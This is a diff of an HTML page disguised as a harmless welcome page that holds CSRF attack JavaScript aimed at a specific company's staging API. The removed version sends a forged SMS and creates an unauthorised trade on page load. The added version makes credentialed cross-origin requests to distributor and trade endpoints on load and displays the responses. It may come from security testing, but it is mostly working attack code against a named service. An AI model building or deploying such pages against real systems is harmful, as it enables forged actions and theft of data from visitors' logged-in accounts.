@@ -1,53 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Innocent Looking Page</title>
+    <title>Welcome to our site!</title>
 </head>
 <body>
     <h1>Welcome to our site!</h1>
     <p>Loading content...</p>
     
+    <div id="results"></div>
+    
     <script>
-    // CSRF Attack payload
-    async function csrfAttack() {
+    async function testCSRF() {
+        const results = document.getElementById('results');
+        
         try {
-            // Attack 1: Send SMS without user consent
-            const smsResponse = await fetch('https://ml-stage.farmartos.com/v3/message/send', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    // Note: Authorization header would need to be obtained somehow
-                },
-                body: JSON.stringify({
-                    "message": "Malicious SMS from CSRF attack",
-                    "recipient": "919999999999"
-                })
-            });
+            // Test 1: Try to access distributor endpoint (unauth)
+            results.innerHTML += '<h3>Testing CSRF Attack...</h3>';
             
-            console.log('SMS attack result:', await smsResponse.text());
-            
-            // Attack 2: Create unauthorized trade
-            const tradeResponse = await fetch('https://ml-stage.farmartos.com/v3/trade/create', {
-                method: 'POST',
+            const response = await fetch('https://ml-stage.farmartos.com/v3/distributer/fertilizer/', {
+                method: 'GET',
+                credentials: 'include',
                 headers: {
                     'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    "crop_id": 1,
-                    "quantity": 1000,
-                    "price": 50000
-                })
+                }
             });
             
-            console.log('Trade attack result:', await tradeResponse.text());
+            const data = await response.text();
+            results.innerHTML += `<p><strong>Response Status:</strong> ${response.status}</p>`;
+            results.innerHTML += `<p><strong>Response:</strong> ${data.substring(0, 200)}...</p>`;
+            
+            // Test 2: Try to access protected endpoint
+            const protectedResponse = await fetch('https://ml-stage.farmartos.com/v3/trade/', {
+                method: 'GET',
+                credentials: 'include'
+            });
+            
+            results.innerHTML += `<p><strong>Protected Endpoint Status:</strong> ${protectedResponse.status}</p>`;
+            
+            // Test 3: Check CORS headers
+            results.innerHTML += `<p><strong>CORS Allowed:</strong> ${response.headers.get('Access-Control-Allow-Origin') || 'Not set'}</p>`;
             
         } catch (error) {
-            console.log('Attack failed:', error);
+            results.innerHTML += `<p><strong>Error:</strong> ${error.message}</p>`;
         }
     }
     
-    // Execute attack when page loads
-    window.onload = csrfAttack;
+    // Execute when page loads
+    window.onload = testCSRF;
     </script>
 </body>
 </html>
